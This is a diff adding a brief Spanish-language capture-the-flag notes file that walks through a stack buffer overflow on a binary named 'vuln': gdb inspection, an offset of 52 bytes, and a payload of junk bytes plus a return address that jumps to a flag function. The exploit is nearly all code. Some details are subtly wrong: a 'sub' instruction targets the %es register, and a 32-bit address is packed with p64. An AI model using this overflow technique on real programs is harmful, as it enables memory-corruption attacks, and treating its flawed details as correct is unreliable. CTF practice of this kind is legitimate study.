@@ -1,0 +1,14 @@
+# Revisamos binario 
+gdb vuln
+# Encontramos funciones
+info func
+# Desemsamblamos main 
+disas main
+# Desemsamblamos unsafe y encontramos una definicion de largo de caracteres
+0x08049176 <+4>:     sub    $0x34,%es
+# 16^0*4 + 16^1*3 = 52 Por lo tanto el buffer overflow es a los 52 bytes
+payload = b'A' * 52         # Junk
+# Luego desde la variable de retorno saltamos al sector de memoria flag
+payload += p64(0x080491c3)      # Flag
+
+
